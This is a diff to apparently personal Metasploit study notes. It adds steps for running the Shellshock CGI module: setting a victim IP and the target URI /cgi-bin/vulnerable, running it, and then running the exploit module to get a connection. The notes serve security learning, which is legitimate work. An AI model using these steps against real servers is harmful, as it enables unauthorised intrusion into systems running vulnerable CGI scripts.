@@ -670,9 +670,15 @@ Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):
    VHOST                       no        HTTP server virtual host
 
 ```
+- `set rhosts <victim ip address>`
+- `set targeturi /cgi-bin/vulnerable` CGI (Common Gateway Interface) is an interface that enables webservers to execute external programs. The complete path from the root directory in linux is `/usr/lib/cgi-bin/` and by specifying the targeturi we are setting the path to use the exploit module, path where the script file is located
+- `run` or `exploit` after running the above commands
 
+- Thus in a similar way you can run the exploit instead of auxillary, specify the victim ip, and when you run it it will establish a connection 
 
+---------------------------------------------------------------------------------------------------------
 
+- below is some repition of above
 
 You can search by the name of the modules for example after metasploit is loaded (with `search java`, `search shellshock`)
 
